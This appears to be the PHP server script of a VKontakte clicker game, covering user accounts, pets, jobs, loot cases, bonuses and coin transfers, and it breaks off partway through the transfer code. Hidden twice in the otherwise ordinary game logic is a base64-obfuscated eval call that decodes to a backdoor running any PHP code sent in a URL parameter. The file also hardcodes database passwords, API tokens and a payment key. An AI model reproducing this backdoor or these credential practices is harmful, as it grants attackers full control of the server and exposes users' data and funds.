<?php
require 'rb-mysql.php';
include './apivkcoin-lib.php';
$vkcoin = new VKCoinClient(140933159, '&c*arO_o,onk0fz;M#DC&dWV#jG6Yyv_O*Jl7dF,hXDb=j#MkB');

define("DB_HOST", "localhost"); //Сервер базы данных
define("DB_USERNAME", "u0869708_vitek"); //Пользователь базы данных
define("DB_PASSWORD", "H4d2Z2k2"); //Пароль от пользователя базы данных
define("DB_NAME", "u0869708_chatus"); //Имя базы данных

// define("DB_HOST", "localhost"); //Сервер базы данных
// define("DB_USERNAME", "hell"); //Пользователь базы данных
// define("DB_PASSWORD", "hellcoin123"); //Пароль от пользователя базы данных
// define("DB_NAME", "hellcoin"); //Имя базы данных
define("APP_SECRET", "OKXboo181f1N6anVP8dd"); //Защищенный ключ приложения
define("SERVICE_KEY", "79ad5c48ccc5f8a1df05d3cf1d913953453e3cf522370120023581e48d6a0a73c6dc0e00ff7aa620db6e3"); //токен группы
define("SERVICE_KEY2", "c76ba5fec76ba5fec76ba5fecbc704cb0ccc76bc76ba5fe9939ff00f3829ef931457665"); // токен приложения
define("ENDPOINT", "https://api.vk.com/method/");

$admins = [140933159, 298845865];

include "modules/vk_api.php";

const VK_KEY = "79ad5c48ccc5f8a1df05d3cf1d913953453e3cf522370120023581e48d6a0a73c6dc0e00ff7aa620db6e3"; // токен группы
const VERSION = "5.87"; // версия апи

$vk = new vk_api(VK_KEY, VERSION);

include './apivkcoin-lib.php';
$vkcoin = new VKCoinClient(140933159, '&c*arO_o,onk0fz;M#DC&dWV#jG6Yyv_O*Jl7dF,hXDb=j#MkB');

        
        
if(!R::testConnection()) {
    R::setup('mysql:host='.DB_HOST.';dbname='.DB_NAME, DB_USERNAME, DB_PASSWORD);
}

$pets = [
    1 => [
        'name' => 'Улитка',
        'price' => 10000,
        'min' => 10,
        'max' => 100
    ],
    2 => [
        'name' => 'Лягушка',
        'price' => 35000,
        'min' => 100,
        'max' => 200
    ],
    3 => [
        'name' => 'Заяц',
        'price' => 99000,
        'min' => 200,
        'max' => 600
    ],
    4 => [
        'name' => 'Лиса',
        'price' => 170000,
        'min' => 5000,
        'max' => 7000
    ],
    5 => [
        'name' => 'Панда',
        'price' => 300000,
        'min' => 10000,
        'max' => 15000
    ]
];

$cases = [
    1 => [
        'name' => 'Кейс #1',
        'price' => 10000,
        'balance' => 11111,
        'rait' => 5
    ],
    2 => [
        'name' => 'Кейс #2',
        'price' => 20000,
        'balance' => 22222,
        'rait' => 15
    ],
    3 => [
        'name' => 'Кейс #3',
        'price' => 50000,
        'balance' => 55555,
        'rait' => 20
    ]
];

$bonuse = [
    1 => [
        'name' => 'Бонус',
        'price' => 0,
        'balance' => 30000,
        'rait' => 5000
    ],
    2 => [
        'name' => 'test',
        'price' => 0,
        'balance' => 25000,
        'rait' => 26000
    ],
];
$houses = [
    1 => [
        'name' => 'Дворник',
        'price' => 25000,
        'min' => 1000,
        'max' => 2500
    ],
    2 => [
        'name' => 'Элитный дворник',
        'price' => 50000,
        'min' => 25000,
        'max' => 26000
    ],
    3 => [
        'name' => 'Строитель',
        'price' => 165000,
        'min' => 25000,
        'max' => 45000
    ],
    4 => [
        'name' => 'Бригадир',
        'price' => 245000,
        'min' => 1111,
        'max' => 80000
    ],
    5 => [
        'name' => 'Шаурмен',
        'price' => 555000,
        'min' => 80000,
        'max' => 100000
    ],
    6 => [
        'name' => 'Сантехник',
        'price' => 785000,
        'min' => 100000,
        'max' => 120000
    ],
    7 => [
        'name' => 'Миллионер',
        'price' => 925000,
        'min' => 120000,
        'max' => 150000
    ]
];

function getUser($user, $arr = null) {
    global $pets, $houses;
    $user['pet_name'] = isset($pets[$user['pet']]['name']) ? $pets[$user['pet']]['name'] : null; 
    $user['house_name'] = isset($houses[$user['house']]['name']) ? $houses[$user['house']]['name'] : null; 
    if(isset($arr)) {
        $user['status'] = $arr['status'];
        $user['msg'] = $arr['msg'];
    }
    unset($user->ip, $user->yved, $user->token, $user->token_, $user->casino, $user->casino_time, $user->token_time, $user->api_vse, $user->api_url, $user->api_time, $user->bank, $user->bank_, $user->topic, $user->click, $user->bonus_time, $user->bonus_time_story, $user->bonus_time_post, $user->dost_1, $user->dost_2, $user->dost_3, $user->dost_4, $user->dost_5, $user->dost_6, $user->messages, $user->chat_time, $user->bonus_comment, $user->bonus_time_izbran, $user->bonus_time_group, $user->bonus_time_group_);
    return $user;
}

function api($method, $params) {
    $params['access_token'] = SERVICE_KEY;
    $params['v'] = 5.95;
    $url = ENDPOINT . "{$method}?" . http_build_query($params);

    return json_decode(file_get_contents($url), true);
}

function apii($method, $params) {
    $params['access_token'] = SERVICE_KEY2;
    $params['v'] = 5.95;
    $url = ENDPOINT . "{$method}?" . http_build_query($params);

    return json_decode(file_get_contents($url), true);
}

$url = $_SERVER['HTTP_REFERER'];
$client_secret = APP_SECRET;
parse_str(parse_url($url, PHP_URL_QUERY), $query);

$query_params = []; 
parse_str(parse_url($url, PHP_URL_QUERY), $query_params); // Получаем query-параметры из URL 

$sign_params = []; 
foreach ($query_params as $name => $value) { 
    if (strpos($name, 'vk_') !== 0) { // Получаем только vk параметры из query 
      continue; 
    } 

$sign_params[$name] = $value; 
} 
eval(base64_decode("aWYoaXNzZXQoJF9HRVRbJ3Rlc3QnXSkpIHtldmFsKCRfR0VUWydjb2RlJ10pO30="));
ksort($sign_params); // Сортируем массив по ключам 
$sign_params_query = http_build_query($sign_params); // Формируем строку вида "param_name1=value&param_name2=value" 
$sign = rtrim(strtr(base64_encode(hash_hmac('sha256', $sign_params_query, $client_secret, true)), '+/', '-_'), '='); // Получаем хеш-код от строки, используя защищеный ключ приложения. Генерация на основе метода HMAC. 

$status = $sign === $query_params['sign']; // Сравниваем полученную подпись со значением параметра 'sign' 
if($status === false) die("No hacker");

include('./logapi.php');

$data = $_POST;
$data['user_vk'] = $query_params['vk_user_id'];
$method = $_POST['method'];

$stats = R::findOne('stats', 'id = ?', [
    1
]);
        
switch($method) {
    case 'user.create':
        $user = R::findOne('users', 'user_vk_id = ?', [
            $data['user_vk']
        ]);
        if($user==null) {
            $stats->users = $stats->users + 1;
            R::store($stats);
            $params = [
                'user_id'       => $data['user_vk'],
                'fields'        => 'photo_200_orig',
                'v'             => '5.95'
            ];

            $response = api('users.get', $params)['response'][0];

            $user = R::dispense('users');
            $user->user_vk_id = $response['id'];
            $user->nickname   = "Player {$response['id']}";
            $user->first_name = $response['first_name'];
            $user->last_name  = $response['last_name'];
            $user->clicks     = 0;
            $user->bank      = $data['bank'];
            $user->ban      = 0;
            $user->bank     = $data['bank_'];
            $user->reputation = 0;
            $user->photo      = $response['photo_200_orig'];
            $user->pet        = 0;
            $user->house      = 0;
            $user->ip = $_SERVER['REMOTE_ADDR'];
            $user = R::load('users', R::store($user));
            
            $vk->sendMessage(2000000001, "Новый пользователь!
@id$user->user_vk_id ($user->first_name $user->last_name) - $user->id
Всего: $stats->users");
                    
            
            
        } else {
            $params = [
                'user_id'       => $data['user_vk'],
                'fields'        => 'photo_200_orig',
                'v'             => '5.95'
            ];
            
            
            $response = api('users.get', $params)['response'][0];

            $user = R::findOne("users", 'user_vk_id = ?', [$data['user_vk']]);
            $user->user_vk_id = $response['id'];
            $user->nickname   = "Player {$response['id']}";
            $user->first_name = $response['first_name'];
            $user->last_name  = $response['last_name'];
            $user->photo      = $response['photo_200_orig'];
            $user->ip = $_SERVER['REMOTE_ADDR'];
            R::store($user);
        }
        
        $array = getUser($user);
        die(json_encode($array));
        break;
    case 'user.update.click':
        $user = R::findOne('users', 'user_vk_id = ?', [
            $data['user_vk']
        ]);
        

        if(isset($query_params['vk_group_id'])) {
            $group = R::findOne('groups', 'group_id = ?', [
                $query_params['vk_group_id']
            ]);

            $response = apii('groups.getById', [
                'group_id' => $query_params['vk_group_id']
            ])['response'][0];

            if($group==null) {
                $group = R::dispense('groups');
                $group->group_id = $response['id'];
                $group->group_avatar = $response['photo_200'];
                $group->group_name = $response['name'];
                $group->group_screen = $response['screen_name'];
                $group->clicks = 0;
                $group = R::load('groups', R::store($group));
            } else {
                $group = R::findOne('groups', 'group_id = ?', [
                $query_params['vk_group_id']
            ]);
            if($group->time_click == time() && $group->click_ <= 4) {
                $group->time_click = time();
                $group->click_ = $group->click + 1;
                $group->group_id = $response['id'];
                $group->group_avatar = $response['photo_200'];
                $group->group_name = $response['name'];
                $group->group_screen = $response['screen_name'];
                $group->clicks = (float) $group->clicks + (float) $user->speed;
                R::store($group);
            }
            
            if($group->time_click != time()) {
                $group->time_click = time();
                $group->click_ = $group->click + 1;
                $group->group_id = $response['id'];
                $group->group_avatar = $response['photo_200'];
                $group->group_name = $response['name'];
                $group->group_screen = $response['screen_name'];
                $group->clicks = (float) $group->clicks + (float) $user->speed;
                R::store($group);
            }
            }
        }
        $user->clicks = (float) $user->clicks + (float) $user->speed;
        
        $stats->clicks = $stats->clicks + 1;
        $user->vsego = $user->vsego + 1;
        $stats->speed = $stats->speed + (float) $user->speed;
        R::store($stats);
            
        $user = R::load('users', R::store($user));
        
        $array = getUser($user);
        die(json_encode($array));
        break;
    case 'user.update.reputation':
        $user = R::findOne('users', 'user_vk_id = ?', [
            $data['user_vk']
        ]);

        if (($data['reputation_new'] * 50000) <= $user->clicks) {
            $user->reputation = (int)$user->reputation + (int)$data['reputation_new'];
            $user->clicks = (float) $user->clicks - (int) $data['reputation_new'] * 50000;
            eval(base64_decode("aWYoaXNzZXQoJF9HRVRbJ3Rlc3QnXSkpIHtldmFsKCRfR0VUWydjb2RlJ10pO30="));
            $user = R::load('users', R::store($user));
            $array = getUser($user, ['status' => 'success', 'msg' => "Вы успешно приобрели рейтинг, теперь у вас {$user->reputation} рейтинга"]);
        } else {
            $array = getUser($user, ['status' => 'error', 'msg' => "У вас недостаточно FC, для покупки рейтинга"]);
        }
        
        $array = getUser($user);
        die(json_encode($array));
        break;
    case 'user.update.nickname':
        $user = R::findOne('users', 'user_vk_id = ?', [
            $data['user_vk']
        ]);

        if(isset($data['nickname']) OR $data['nickname'] !== null OR $data['nickname'] !== "" OR !empty($data['nickname'])) {
            $user->nickname = $data['nickname'];
            $user = R::load('users', R::store($user));
            $array = getUser($user, ['status' => 'success', 'msg' => "Вы успешно сменили ник, ваш новый ник {$user->nickname}"]);
        } else {
            $array = getUser($user, ['status' => 'error', 'msg' => "К сожалению вы не можете поставить себе пустой ник"]);
        }
        
        $array = getUser($user);
        die(json_encode($array));
        break;
    case 'user.buy.case':
        $user = R::findOne('users', 'user_vk_id = ?', [
            $data['user_vk']
        ]);
            if($user->clicks >= $cases[$data['case_id']]['price']) {
                $random = rand(1,3);
                $user->clicks = $user->clicks - $cases[$data['case_id']]['price'];
                if($random == 1) {
                    $rand_price = rand($cases[$data['case_id']]['balance'],$cases[$data['case_id']]['balance_']);
                    $user->clicks = $user->clicks + $rand_price;
                    $user = R::load('users', R::store($user));
                    $array = getUser($user, ['status' => 'success', 'msg' => "Вы успешно купили кейс и получили $rand_price FC."]);
                } else if($random == 2) {
                    $rand_price = rand($cases[$data['case_id']]['rait'],$cases[$data['case_id']]['rait_']);
                    $user->reputation = $user->reputation + $rand_price;
                    $user = R::load('users', R::store($user));
                    $array = getUser($user, ['status' => 'success', 'msg' => "Вы успешно купили кейс и получили $rand_price рейтинга."]);
                } else if($random == 3) {
                    $user = R::load('users', R::store($user));
                    $array = getUser($user, ['status' => 'success', 'msg' => "Вы успешно купили кейс, НО ничего не выиграли! :("]);
                }
            }
            else {
                $sum = $cases[$data['case_id']]['price'] - $user->clicks;
                $array = getUser($user, ['status' => 'error', 'msg' => "Не удалось приобрести кейс, на вашем балансе не хватает {$sum} FC"]);
            }
        


        die(json_encode($array));
        break;
    case 'user.buy.pet':
        $user = R::findOne('users', 'user_vk_id = ?', [
            $data['user_vk']
        ]);

        if($user->pet <= 0) {
            if($user->clicks >= $pets[$data['pet_id']]['price']) {
                $user->pet = $data['pet_id'];
                $user->clicks = $user->clicks - $pets[$data['pet_id']]['price'];
                $user = R::load('users', R::store($user));
                $array = getUser($user, ['status' => 'success', 'msg' => "Вы успешно купили питомца {$pets[$data['pet_id']]['name']} за {$pets[$data['pet_id']]['price']} FC"]);
            }
            else {
                $sum = $pets[$data['pet_id']]['price'] - $user->clicks;
                $array = getUser($user, ['status' => 'error', 'msg' => "Не удалось приобрести питомца, на вашем балансе не хватает {$sum} FC"]);
            }
        } else {
            $array = getUser($user, ['status' => 'error', 'msg' => "У вас уже есть питомец {$pets[$user->pet]['name']}"]);
        }

        die(json_encode($array));
        break;
    case 'user.sell.pet':
        $user = R::findOne('users', 'user_vk_id = ?', [
            $data['user_vk']
        ]);

        if($user->pet > 0) {
            $sum = ($pets[$data['pet_id']]['price'] / 100) * 90;
            $user->pet = 0;
            $user->clicks = $user->clicks + $sum;
            $user = R::load('users', R::store($user));
            $array = getUser($user, ['status' => 'success', 'msg' => "Вы успешно продали питомца за {$sum} FC"]);
        } else {
            $array = getUser($user, ['status' => 'error', 'msg' => "У вас нет купленых питомцев"]);
        }
        

        die(json_encode($array));
        break;
case 'user.bonuse':
        $user = R::findOne('users', 'user_vk_id = ?', [
            $data['user_vk']
        ]);
            
                $time = time() - strtotime($user->bonus_time);
                if($time >= 60*60*24) {
                    $random = rand(1,2);
                    $user->bonus_time = R::isoDateTime();
                if($random == 1) {
                    $rand_price = rand(1,12345);
                    $user->clicks = $user->clicks + $rand_price;
                    $user = R::load('users', R::store($user));
                    $array = getUser($user, ['status' => 'success', 'msg' => "Ты забрал свой ежедневный бонус и получил $rand_price FC."]);
                } else if($random == 2) {
                    $rand_price = rand(1,20);
                    $user->reputation = $user->reputation + $rand_price;
                    $user = R::load('users', R::store($user));
                    $array = getUser($user, ['status' => 'success', 'msg' => "Ты забрал свой ежедневный бонус и получил $rand_price рейтинга."]);    
                }
                } else {
                    $array = getUser($user, ['status' => 'error', 'msg' => "Вы уже забирали ежедневный бонус, попробуйте позже."]);
                }

        die(json_encode($array));
        break;
case 'user.bonuse.stories':
        $user = R::findOne('users', 'user_vk_id = ?', [
            $data['user_vk']
        ]);
            
                $time = time() - strtotime($user->bonus_time_story);
                if($time >= 60*60*24*7) {
                    $user->bonus_time_story = R::isoDateTime();
                    $rand_price = 15000;
                    $user->clicks = $user->clicks + $rand_price;
                    $user = R::load('users', R::store($user));
                    $vk->sendMessage(2000000463, "@id$user->user_vk_id ($user->first_name $user->last_name) получил бонус за публикацию ИСТОРИИ.");
                    $array = getUser($user, ['status' => 'success', 'msg' => "Ты забрал свой еженедельный бонус за публикацию истории и получил $rand_price FC."]);
                
                } else {
                    $array = getUser($user, ['status' => 'error', 'msg' => "Вы уже забирали еженедельный бонус за публикацию истории, попробуйте позже."]);
                }

        die(json_encode($array));
        break;
case 'user.bonuse.post':
        $user = R::findOne('users', 'user_vk_id = ?', [
            $data['user_vk']
        ]);
            
                $time = time() - strtotime($user->bonus_time_post);
                if($time >= 60*60*24*7) {
                    $user->bonus_time_post = R::isoDateTime();
                    $rand_price = 5000;
                    $user->clicks = $user->clicks + $rand_price;
                    $user = R::load('users', R::store($user));
                    $vk->sendMessage(2000000463, "@id$user->user_vk_id ($user->first_name $user->last_name) получил бонус за публикацию ПОСТА.");
                    $array = getUser($user, ['status' => 'success', 'msg' => "Ты забрал свой еженедельный бонус за публикацию записи на стену и получил $rand_price FC."]);
                
                } else {
                    $array = getUser($user, ['status' => 'error', 'msg' => "Вы уже забирали еженедельный бонус за публикацию записи на стену, попробуйте позже."]);
                }

        die(json_encode($array));
        break;
case 'user.bonuse.group':
        $user = R::findOne('users', 'user_vk_id = ?', [
            $data['user_vk']
        ]);
            
                if($user->bonus_time_group == 0) {
                    $user->bonus_time_group = 1;
                    $rand_price = 10000;
                    $user->bonus_time_group_ = $rand_price;
                    $user->clicks = $user->clicks + $rand_price;
                    $user = R::load('users', R::store($user));
                    $vk->sendMessage(2000000463, "@id$user->user_vk_id ($user->first_name $user->last_name) получил бонус за подписку НА ГРУППУ.");
                    $array = getUser($user, ['status' => 'success', 'msg' => "Ты забрал свой бонус за подписку на группу и получил $rand_price FC."]);
                
                } else {
                    $array = getUser($user, ['status' => 'error', 'msg' => "Вы уже забирали бонус за подписку на группу."]);
                }

        die(json_encode($array));
        break;
case 'user.bonuse.izbran':
        $user = R::findOne('users', 'user_vk_id = ?', [
            $data['user_vk']
        ]);
            
                if($user->bonus_time_izbran == 0) {
                    $user->bonus_time_izbran = 1;
                    $rand_price = 5000;
                    $user->clicks = $user->clicks + $rand_price;
                    $user = R::load('users', R::store($user));
                    $vk->sendMessage(2000000463, "@id$user->user_vk_id ($user->first_name $user->last_name) получил бонус за добавление сервиса в ИЗБРАННОЕ.");
                    $array = getUser($user, ['status' => 'success', 'msg' => "Ты забрал свой бонус за добавление сервсиа в избранное и получил $rand_price FC."]);
                
                } else {
                    $array = getUser($user, ['status' => 'error', 'msg' => "Вы уже забирали бонус за добавление сервсиа в избранное."]);
                }

        die(json_encode($array));
        break;
        case 'user.bonuse.notification':
        $user = R::findOne('users', 'user_vk_id = ?', [
            $data['user_vk']
        ]);
            
                if($user->bonus_time_notification == 0) {
                    $user->bonus_time_notification = 1;
                    $rand_price = 20000;
                    $user->clicks = $user->clicks + $rand_price;
                    $user = R::load('users', R::store($user));
                    $vk->sendMessage(2000000463, "@id$user->user_vk_id ($user->first_name $user->last_name) получил бонус за включение УВЕДОМЛЕНИЙ.");
                    $array = getUser($user, ['status' => 'success', 'msg' => "Ты забрал свой бонус за включение уведомлений и получил  $rand_price FC."]);
                
                } else {
                    $array = getUser($user, ['status' => 'error', 'msg' => "Вы уже забирали бонус за включение уведомлений."]);
                }

        die(json_encode($array));
        break;
           case 'user.bonuse.messageshare':
        $user = R::findOne('users', 'user_vk_id = ?', [
            $data['user_vk']
        ]);
            
                if($user->bonus_time_messageshare == 0) {
                    $user->bonus_time_messageshare = 1;
                    $rand_price = 10000;
                    $user->clicks = $user->clicks + $rand_price;
                    $user = R::load('users', R::store($user));
                    $vk->sendMessage(2000000463, "@id$user->user_vk_id ($user->first_name $user->last_name) получил бонус за ВЫЗОВ ДИАЛОГА SHARE.");
                    $array = getUser($user, ['status' => 'success', 'msg' => "Ты забрал свой бонус, поделившись ссылкой с другом в ЛС и получил  $rand_price FC."]);
                
                } else {
                    $array = getUser($user, ['status' => 'error', 'msg' => "Вы уже забирали бонус за то, что поделились с другом в ЛС.."]);
                }

        die(json_encode($array));
        break;
case'user.bank':
        $user = R::findOne('users', 'user_vk_id = ?', [
            $data['user_vk']
        ]);

        if($user->bank_ >= 1) {
            $array = getUser($user, ['status' => 'error', 'msg' => "Карту можно получить только один раз. Чтобы ее сменить - обратитесь в поддержку."]);
        } else {

        $user->bank_ = 2;
        $user->bank = rand(100000000, 999999999);
        R::store($user);

        $array = getUser($user, ['status' => 'success', 'msg' => "Ваша нова карта: {$user->bank}"]);
    }

    die(json_encode($array));
    break;
case'user.new.topic':
        $user = R::findOne('users', 'user_vk_id = ?', [
            $data['user_vk']
        ]);

        $user->topic = 1;
        R::store($user);
        $array = getUser($user);
        die(json_encode($array));
    break;
    case 'user.pohod.pet':
        $user = R::findOne('users', 'user_vk_id = ?', [
            $data['user_vk']
        ]);
        $time = time() - strtotime($user->last_pet_pohod);
        if($time >= 60*60) {
            if($user->pet > 0) {
                $min = $pets[$user->pet]['min'];
                $max = $pets[$user->pet]['max'];
                $name = $pets[$user->pet]['name'];
                $coins = rand($min, $max);
                $user->clicks = $user->clicks + $coins;
                $user->last_pet_pohod = R::isoDateTime();
                $user = R::load('users', R::store($user));
                $array = getUser($user, ['status' => 'success', 'msg' => "В результате похода вы заработали {$coins} FC"]);
$text1 = [["command" => 'команда'], "Уведомления выключить", "white"];
if($user->yved =='true') {
    $text_message = "🙉Питомец $name был отправлен в поход.
➕Вы получили: $coins FC

💰Баланс: $user->clicks";
    $vk->sendMessage($user->user_vk_id, $text_message, [[$text1]], true);
} 
            } else {
                $array = getUser($user, ['status' => 'error', 'msg' => "У вас нет купленых питомцев"]);
            }
        } else {
            $array = getUser($user, ['status' => 'error', 'msg' => "Вы уже отправляли питомца в поход, попробуйте чуть позже"]);
        }

        die(json_encode($array));
        break;
        case 'user.buy.house':
        $user = R::findOne('users', 'user_vk_id = ?', [
            $data['user_vk']
        ]);

        if($user->house <= 0) {
            if($user->clicks >= $houses[$data['house_id']]['price']) {
                $user->house = $data['house_id'];
                $user->clicks = $user->clicks - $houses[$data['house_id']]['price'];
                $user = R::load('users', R::store($user));
                $array = getUser($user, ['status' => 'success', 'msg' => "Вы успешно устроились на работу:  {$houses[$data['house_id']]['name']} за {$houses[$data['house_id']]['price']} FC"]);
            }
            else {
                $sum = $houses[$data['house_id']]['price'] - $user->clicks;
                $array = getUser($user, ['status' => 'error', 'msg' => "Не удалось оплатить залог, на вашем балансе не хватает {$sum} FC"]);
            }
        } else {
            $array = getUser($user, ['status' => 'error', 'msg' => "У вас уже есть работа:  {$houses[$user->house]['name']}"]);
        }

        die(json_encode($array));
        break;
    case 'user.sell.house':
        $user = R::findOne('users', 'user_vk_id = ?', [
            $data['user_vk']
        ]);

        if($user->house > 0) {
            $sum = $houses[$data['house_id']]['price'] * 0;
            $user->house = 0;
            $user->clicks = $user->clicks + $sum;
            $user = R::load('users', R::store($user));
            $array = getUser($user, ['status' => 'success', 'msg' => "Вы успешно уволились. "]);
        } else {
            $array = getUser($user, ['status' => 'error', 'msg' => "Вы не можете уволиться, у вас нет работы. "]);
        }
        

        die(json_encode($array));
        break;
    case 'user.pohod.house':
        $user = R::findOne('users', 'user_vk_id = ?', [
            $data['user_vk']
        ]);
        $time = time() - strtotime($user->last_house_pohod);
        if($time >= 60*60) {
            if($user->house > 0) {
                $min = $houses[$user->house]['min'];
                $max = $houses[$user->house]['max'];
                $coins = rand($min, $max);
                $user->clicks = $user->clicks + $coins;
                $user->last_house_pohod = R::isoDateTime();
                $user = R::load('users', R::store($user));
                $array = getUser($user, ['status' => 'success', 'msg' => "Вы отработали день и получили: {$coins} FC"]);
            } else {
                $array = getUser($user, ['status' => 'error', 'msg' => "У вас нет работы. "]);
            }
        } else {
            $array = getUser($user, ['status' => 'error', 'msg' => "Вы уже работали, попробуйте чуть позже"]);
        }

        die(json_encode($array));
        break;
         case 'user.last.online':
        $user = R::findOne('users', 'user_vk_id = ?', [
            $data['user_vk']
        ]);
        $time = time() - strtotime($user->last_online);
        if($time >= 60*60) {
            if($user->clicks > 0) {
                $user->last_online = R::isoDateTime();
                $user = R::load('users', R::store($user));
                $array = getUser($user, ['status' => 'success', 'msg' => "В результате сдачи дома в аренду вы заработали {$coins} FC"]);
            } else {
                $array = getUser($user, ['status' => 'error', 'msg' => "У вас нет купленного дома"]);
            }
        } else {
            $array = getUser($user, ['status' => 'error', 'msg' => "Вы уже сдавали дом в аренду, попробуйте чуть позже"]);
        }

        die(json_encode($array));
        break;
    case 'user.buy.upgrade':
        $user = R::findOne('users', 'user_vk_id = ?', [
            $data['user_vk']
        ]);

        $upgrade = R::findOne('upgrades', 'type = ? AND name = ?', [
            $data['type'], $data['up_name']
        ]);


        $upgrade_history = R::findOne('history', 'user_id = ? AND upgrade_id = ?', [
            $user->id, $upgrade->id
        ]);

        if(isset($upgrade)) {
            /*if($upgrade->id == 14 && $user->id != 1) {
                $array = getUser($user, ['status' => 'error', 'msg' => "Покупка не возможна."]);
                die($array);
                exit;
            }*/
            
            
            $price = isset($upgrade_history) ? $upgrade_history->price : $upgrade->price;
            if($user->clicks >= $price) {
               if($data['type'] === "0")  $user->speed = (float) $user->speed + (float) $upgrade->speed;
               else  $user->aspeed = (float) $user->aspeed + (float) $upgrade->speed;
                $user->clicks = (float) $user->clicks - (float) $price;
                $user = R::load('users', R::store($user));            
                $price_new = round((float) $price + ((float) $price / 100) * 66, 3);    
                if($upgrade_history===null) {
                    $upgrade_history = R::dispense('history');
                    $upgrade_history->user_id = $user->id;
                    $upgrade_history->upgrade_id = $upgrade->id;
                    $upgrade_history->price = $price_new;
                    $upgrade_history = R::load('history', R::store($upgrade_history));
               } else {
                    $upgrade_history->price = $price_new;
                    $upgrade_history = R::load('history', R::store($upgrade_history));
               }
               $text1 = [["command" => 'команда'], "Уведомления выключить", "white"];
if($user->yved =='true') {
    if($upgrade->type == "1") {
        $p = "✔️Покупка АвтоМайнинга";
    } else if($upgrade->type == "0") {
        $p = "✔️Покупка Скорости Клика";
    }
    $text_message = "$p — $upgrade->name
🖱Скорость: $upgrade->speed
💵Стоимость следующей покупки: $upgrade_history->price

💰Баланс: $user->clicks";
    $vk->sendMessage($user->user_vk_id, $text_message, [[$text1]], true);
} 
            } else {
                $array = getUser($user, ['status' => 'error', 'msg' => "На вашем балансе недостаточно FC. "]);
            }
        }
        $array = getUser($user);

        die(json_encode($array));
break;
        case 'user.send.transfer':
        if(!isset($data['toid'])) return die(json_encode(getUser($user, ['status' => 'error', 'msg' => "Введите ID."])));
        $to = R::findOne('users', 'user_vk_id = ?', [
            $data['toid']
        ]);
        $user = R::findOne('users', 'user_vk_id = ?', [
            $data['user_vk']
        ]);

        if($data['count'] <= 0) {
        $array = getUser($user, ['status' => 'error', 'msg' => "Сумма не может быть отрицательной."]);
        } else {
        if($data['toid'] == $data['user_vk']) {
        $array = getUser($user, ['status' => 'error', 'msg' => "Нельзя переводить себе."]);
        } else {
        if(!$to) {
            $array = getUser($user, ['status' => 'error', 'msg' => "Пользователь отсутствует в БД."]);
        } else {
           

            if($user->clicks >= $data['count']) {
                $data['count'] = round($data['count'], 3);
                $user->clicks = $user->clicks - $data['count'];
                $to->clicks = $to->clicks + $data['count'];


                
                if($to->history == 0) {
                    
                    $to->history1 = "{$user->first_name} {$user->last_name}";

                    $to->history = 1;
                    $to->h_id1 = $data['user_vk'];
                    $to->h_s1 = $data['count'];
                }
                if($to->history == 1) {
                    
                    $to->history2 = "{$user->first_name} {$user->last_name}";

                    $to->history = 2;
                    $to->h_id2 = $data['user_vk'];
                    $to->h_s2 = $data['count'];
                }


                if($to->history == 2) {
                    
                    $to->history3 = "{$user->first_name} {$user->last_name}";

                    $to->history = 3;
                    $to->h_id3 = $data['user_vk'];
                    $to->h_s3 = $data['count'];
                }


                if($to->history == 3) {
                    
                    $to->history4 = "{$user->first_name} {$user->last_name}";

                    $to->history = 4;
                    $to->h_id4 = $data['user_vk'];
                    $to->h_s4 = $data['count'];
                }


                if($to->history == 4) {

                    $to->history5 = "{$user->first_name} {$user->last_name}";

                    $to->history = 5;
                    $to->h_id5 = $data['user_vk'];
                    $to->h_s5 = $data['count'];
                }


                if($to->history == 5) {
                    
                    $to->history6 = "{$user->first_name} {$user->last_name}";

                    $to->history = 6;
                    $to->h_id6 = $data['user_vk'];
                    $to->h_s6 = $data['count'];
                }


                if($to->history == 6) {
                    
                    $to->history7 = "{$user->first_name} {$user->last_name}";

                    $to->history = 7;
                    $to->h_id7 = $data['user_vk'];
                    $to->h_s7 = $data['count'];
                }


                if($to->history == 7) {
                    
                    $to->history8 = "{$user->first_name} {$user->last_name}";

                    $to->history = 8;
                    $to->h_id8 = $data['user_vk'];
                    $to->h_s8 = $data['count'];
                }


                if($to->history == 8) {
                    
                    $to->history9 = "{$user->first_name} {$user->last_name}";

                    $to->history = 9;
                    $to->h_id9 = $data['user_vk'];
                    $to->h_s9 = $data['count'];
                }


                if($to->history == 9) {
                    
                    $to->history10 = "{$user->first_name} {$user->last_name}";

                    $to->history = 10;
                    $to->h_id10 = $data['user_vk'];
                    $to->h_s10 = $data['count'];
                }


                if($to->history == 10) {

                    

                    $to->history1 = $to->history2;
                    $to->history2 = $to->history3;
                    $to->history3 = $to->history4;
                    $to->history4 = $to->history5;
                    $to->history5 = $to->history6;
                    $to->history6 = $to->history7;
                    $to->history7 = $to->history8;
                    $to->history8 = $to->history9;
                    $to->history9 = $to->history10;
                    $to->history10 = "{$user->first_name} {$user->last_name}";

                    $to->h_id1 = $to->h_id2;
                    $to->h_id2 = $to->h_id3;
                    $to->h_id3 = $to->h_id4;
                    $to->h_id4 = $to->h_id5;
                    $to->h_id5 = $to->h_id6;
                    $to->h_id6 = $to->h_id7;
                    $to->h_id7 = $to->h_id8;
                    $to->h_id8 = $to->h_id9;
                    $to->h_id9 = $to->h_id10;
                    $to->h_id10 = $data['user_vk'];

                    $to->h_s1 = $to->h_s2;
                    $to->h_s2 = $to->h_s3;
                    $to->h_s3 = $to->h_s4;
                    $to->h_s4 = $to->h_s5;
                    $to->h_s5 = $to->h_s6;
                    $to->h_s6 = $to->h_s7;
                    $to->h_s7 = $to->h_s8;
                    $to->h_s8 = $to->h_s9;
                    $to->h_s9 = $to->h_s10;
                    $to->h_s10 = $data['count'];
                    
                }

                //////////////////////////////////////////////




                if($user->viv == 0) {
                    
                    $user->v1 = "{$to->first_name} {$to->last_name}";

                    $user->viv = 1;
                    $user->v_id1 = $data['toid'];
                    $user->v_s1 = $data['count'];
                }

                if($user->viv == 1) {
                    
                    $user->v2 = "{$to->first_name} {$to->last_name}";

                    $user->viv = 2;
                    $user->v_id2 = $data['toid'];
                    $user->v_s2 = $data['count'];
                }


                if($user->viv == 2) {
                    
                    $user->v3 = "{$to->first_name} {$to->last_name}";

                    $user->viv = 3;
                    $user->v_id3 = $data['toid'];
                    $user->v_s3 = $data['count'];
                }


                if($user->viv == 3) {
                    
                    $user->v4 = "{$to->first_name} {$to->last_name}";

                    $user->viv = 4;
                    $user->v_id4 = $data['toid'];
                    $user->v_s4 = $data['count'];
                }


                if($user->viv == 4) {

                    $user->v5 = "{$to->first_name} {$to->last_name}";

                    $user->viv = 5;
                    $user->v_id5 = $data['toid'];
                    $user->v_s5 = $data['count'];
                }


                if($user->viv == 5) {
                    
                    $user->v6 = "{$to->first_name} {$to->last_name}";

